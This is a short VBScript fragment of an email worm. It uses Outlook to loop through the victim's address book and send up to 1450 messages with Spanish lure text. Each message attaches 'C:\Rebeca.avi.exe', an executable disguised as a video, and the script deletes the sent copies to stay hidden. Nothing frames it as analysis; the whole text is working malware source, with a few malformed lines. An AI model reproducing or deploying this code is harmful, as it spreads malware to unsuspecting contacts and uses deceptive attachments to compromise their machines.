On Error Resume Next
Set uHWKgGp=CreateObject("Outlook.Application")
For WbwTbDy=1 To 1450
Set GehULkW=uHWKgGp.CreateItem(0)
GehULkW.Body = "Hola, una nueva esperanza llega, mira el archivo adjunto para ver a la futura esperanza!" & vbcrlf & ""GehULkW.DeleteAfterSubmit = True
GehULkW.Subject = "Hi! Una nueva esperanza!"
GehULkW.To = uHWKgGp.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
GehULkW.Attachments.Add("C:\Rebeca.avi.exe")
if GehULkW.To <> "" then GehULkW.Send
Next
uHWKgGp.Quit
